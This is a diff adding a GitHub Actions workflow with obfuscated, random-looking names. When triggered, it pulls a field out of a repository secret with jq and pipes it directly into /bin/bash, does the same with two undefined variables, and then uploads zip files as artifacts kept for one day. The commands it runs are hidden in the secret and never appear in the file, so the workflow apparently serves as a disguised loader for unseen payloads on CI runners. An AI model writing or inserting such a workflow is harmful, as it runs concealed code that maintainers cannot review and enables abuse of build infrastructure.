@@ -1,0 +1,23 @@
+name: wesleybuild1578
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wesleybuild1578
+        env:
+          j4: ${{ secrets.j4 }}
+        run: |
+          printf '%s' "$j4" | jq -r .yfkd76 | /bin/bash
+          echo $jyafx65901 | jq -r .qvok00699 | /bin/bash
+          echo $de7 | jq -r .uhe26 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: biO19uef
+          path: "*.zip"
+          retention-days: 1
